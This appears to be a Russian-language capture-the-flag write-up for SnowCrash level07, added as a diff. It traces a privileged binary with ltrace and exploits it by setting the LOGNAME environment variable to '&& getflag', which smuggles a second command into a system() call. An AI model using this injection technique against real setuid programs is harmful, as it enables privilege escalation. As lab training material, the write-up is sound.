@@ -1,0 +1,36 @@
+в домашний деректории лежит исполняймый файл level07
+попробуем посмотреть что просходит с помощью отладчика 
+```
+>ltrace ./level07
+```
+в логе нас интересует getenv("LOGNAME")
+```
+__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                 = 2007
+geteuid()                                                                 = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
+getenv("LOGNAME")                                                         = "&& getflag"
+asprintf(0xbffff744, 0x8048688, 0xbfffff5f, 0xb7e5ee55, 0xb7fed280)       = 21
+system("/bin/echo && getflag "
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                    = 0
++++ exited (status 0) +++
+```
+изменив в переменом окружение переменной LOGNAME на test 
+```
+export LOGNAME=test
+```
+можно заметить что у нас вызваеться echo
+```
+level07@SnowCrash:~$ ./level07
+test
+```
+заменим LOGNAME на getflag
+```
+export LOGNAME='&& getflag'
+```
+При запуске получим новый flag
